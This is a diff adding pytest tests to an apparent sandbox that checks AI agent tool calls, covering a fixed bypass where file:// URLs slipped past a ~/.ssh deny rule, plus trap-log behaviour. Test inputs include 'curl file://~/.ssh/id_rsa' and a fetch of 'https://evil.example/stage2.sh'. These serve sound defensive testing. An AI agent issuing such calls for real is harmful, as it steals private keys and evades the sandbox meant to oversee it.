@@ -7,7 +7,6 @@ curl-exfil demo produce a real block under ``network-deny.yaml``.
 
 from __future__ import annotations
 
-import os
 from pathlib import Path
 
 import pytest
@@ -22,7 +21,7 @@ from capsule.hosts.claude_code import (
 from capsule.hosts.registry import DEFAULT_HOST, get_adapter, known_hosts
 from capsule.interpose import CapabilityViolation, Interposer
 from capsule.profile import load_profile, load_profile_file
-from capsule.trap import TrapLog
+from capsule.trap import TrapLog, default_log_path
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
 NETWORK_DENY = REPO_ROOT / "examples" / "profiles" / "network-deny.yaml"
@@ -315,3 +314,96 @@ def test_run_accepts_host_flag_default_claude_code(tmp_path, monkeypatch):
         ],
     )
     assert result2.exit_code != 0
+
+
+# --------------------------------------------------------------------------- #
+# fix-file-url-bypasses-ssh-deny — file:// (and no-host) URLs fail closed
+# --------------------------------------------------------------------------- #
+def test_webfetch_file_url_extracts_path():
+    # Before the fix a file:// URL reduced to a host-less, path-less net_fetch
+    # so only the tool-allow check ran — bypassing the ~/.ssh/** path deny.
+    req = to_call_request("WebFetch", {"url": "file://~/.ssh/id_rsa"})
+    assert req.tool == "net_fetch"
+    assert req.path == "~/.ssh/id_rsa"
+    # Fail-closed: the unresolved host carries the raw URL so the network
+    # rule is still consulted (never a bare host-less net_fetch).
+    assert req.host == "file://~/.ssh/id_rsa"
+
+
+def test_curl_file_url_extracts_path():
+    req = to_call_request("Bash", {"command": "curl file://~/.ssh/id_rsa"})
+    assert req.tool == "shell"
+    assert req.path == "~/.ssh/id_rsa"
+    assert req.access == "read"
+
+
+def test_webfetch_file_url_ssh_denied(tmp_path):
+    # WebFetch file://~/.ssh/id_rsa must be DENIED (path-denied) under
+    # network-deny.yaml, not waved through as a host-less net_fetch.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("WebFetch", {"url": "file://~/.ssh/id_rsa"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_curl_file_url_ssh_denied(tmp_path):
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("Bash", {"command": "curl file://~/.ssh/id_rsa"})
+    assert exc.value.decision.rule == "path-denied"
+
+
+def test_webfetch_no_host_url_fail_closed(tmp_path):
+    # A non-empty URL whose host cannot be resolved (and which is not a
+    # file://, so it carries no path either) must still consult the network
+    # rule — DENY under a deny-by-default allow-list — instead of waving
+    # through as a host-less net_fetch.
+    adapter = ClaudeCodeAdapter(_network_deny_interposer(tmp_path))
+    with pytest.raises(CapabilityViolation) as exc:
+        adapter.check("WebFetch", {"url": "not-a-host-token"})
+    assert exc.value.decision.rule == "network-not-in-profile"
+
+
+def test_webfetch_https_url_still_extracts_host():
+    # Regression guard: the file:// path extraction must not leak into https.
+    req = to_call_request("WebFetch", {"url": "https://evil.example/stage2.sh"})
+    assert req.host == "evil.example"
+    assert req.path is None
+
+
+# --------------------------------------------------------------------------- #
+# fix-trap-log-accumulates-across-runs — default trap log is fresh per run
+# --------------------------------------------------------------------------- #
+def test_report_matches_single_run_after_two_runs(tmp_path, monkeypatch):
+    # The default .capsule/trap.log must be fresh per run so `capsule report`
+    # reflects the LATEST run, not cumulative history. Before the fix, run 2
+    # appended to run 1's events and report read 2 allowed / 8 blocked / 10.
+    monkeypatch.chdir(tmp_path)  # default log lives in tmp, not the repo
+    runner = CliRunner()
+    for _ in range(2):
+        runner.invoke(
+            cli, ["run", "-p", str(NETWORK_DENY), "--skill", str(DEMO_SKILL)]
+        )
+    # report reads the default log; it must show only the latest run (1/4/5).
+    result = runner.invoke(cli, ["report"])
+    assert result.exit_code == 0
+    log = TrapLog.open(default_log_path())
+    log.load()
+    assert log.summary() == {"allowed": 1, "blocked": 4, "total": 5}
+
+
+def test_explicit_log_path_preserves_append_behavior(tmp_path, monkeypatch):
+    # An explicit `--log <path>` keeps append-across-runs (audit retention):
+    # only the DEFAULT log is fresh per run.
+    monkeypatch.chdir(tmp_path)
+    log_path = tmp_path / "audit.log"
+    runner = CliRunner()
+    for _ in range(2):
+        runner.invoke(
+            cli,
+            ["run", "-p", str(NETWORK_DENY), "--skill", str(DEMO_SKILL),
+             "--log", str(log_path)],
+        )
+    log = TrapLog.open(log_path)
+    log.load()
+    assert log.summary() == {"allowed": 2, "blocked": 8, "total": 10}
